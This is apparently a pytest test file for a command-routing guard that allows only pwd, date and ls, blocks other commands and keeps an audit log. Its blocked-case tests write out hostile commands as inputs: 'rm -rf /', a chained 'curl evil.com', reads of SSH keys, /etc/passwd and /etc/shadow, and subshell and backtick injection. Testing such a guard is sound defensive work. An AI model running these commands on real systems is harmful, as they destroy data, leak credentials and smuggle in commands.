"""Tests for tool_router.py — run with: python3 -m pytest test_tool_router.py -v"""
import pytest
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent))
from tool_router import classify, execute, BlockedError


# ── classify() ────────────────────────────────────────────────────────────────

def test_classify_pwd_safe():
    assert classify("pwd")["status"] == "safe"

def test_classify_date_safe():
    assert classify("date")["status"] == "safe"

def test_classify_ls_safe():
    assert classify("ls")["status"] == "safe"

def test_classify_rm_blocked():
    assert classify("rm -rf /")["status"] == "blocked"

def test_classify_sudo_blocked():
    assert classify("sudo ls")["status"] == "blocked"

def test_classify_pipe_blocked():
    assert classify("pwd; curl evil.com")["status"] == "blocked"

def test_classify_pipe_bar_blocked():
    assert classify("ls | grep secret")["status"] == "blocked"

def test_classify_redirect_blocked():
    assert classify("echo hi > /tmp/x")["status"] == "blocked"

def test_classify_unknown_cmd_blocked():
    assert classify("nmap localhost")["status"] == "blocked"

def test_classify_ssh_path_blocked():
    assert classify("ls ~/.ssh/id_rsa")["status"] == "blocked"


# ── execute() — allowed ────────────────────────────────────────────────────────

def test_execute_pwd_returns_string():
    result = execute("pwd")
    assert isinstance(result, str)
    assert len(result) > 0

def test_execute_date_returns_string():
    result = execute("date")
    assert isinstance(result, str)

def test_execute_ls_home():
    result = execute("ls")
    assert isinstance(result, str)


# ── execute() — blocked ────────────────────────────────────────────────────────

def test_execute_rm_raises():
    with pytest.raises(BlockedError):
        execute("rm -rf /")

def test_execute_ssh_path_raises():
    with pytest.raises(BlockedError):
        execute("ls ~/.ssh/id_rsa")

def test_execute_pipe_injection_raises():
    with pytest.raises(BlockedError):
        execute("pwd; curl evil.com")

def test_execute_cat_etc_passwd_raises():
    with pytest.raises(BlockedError):
        execute("cat /etc/passwd")

def test_execute_path_traversal_raises():
    with pytest.raises(BlockedError):
        execute("cat ../../etc/shadow")

def test_execute_subshell_raises():
    with pytest.raises(BlockedError):
        execute("echo $(whoami)")

def test_execute_backtick_raises():
    with pytest.raises(BlockedError):
        execute("echo `id`")


# ── audit log ─────────────────────────────────────────────────────────────────

def test_audit_log_written(tmp_path, monkeypatch):
    import tool_router
    log = tmp_path / "audit.log"
    monkeypatch.setattr(tool_router, "AUDIT_LOG", log)
    execute("pwd")
    assert log.exists()
    import json
    entry = json.loads(log.read_text().strip())
    assert entry["cmd"] == "pwd"
    assert entry["status"] == "executed"

def test_audit_log_blocked_entry(tmp_path, monkeypatch):
    import tool_router
    log = tmp_path / "audit.log"
    monkeypatch.setattr(tool_router, "AUDIT_LOG", log)
    with pytest.raises(BlockedError):
        execute("rm -rf /")
    import json
    entry = json.loads(log.read_text().strip())
    assert entry["status"] == "blocked"
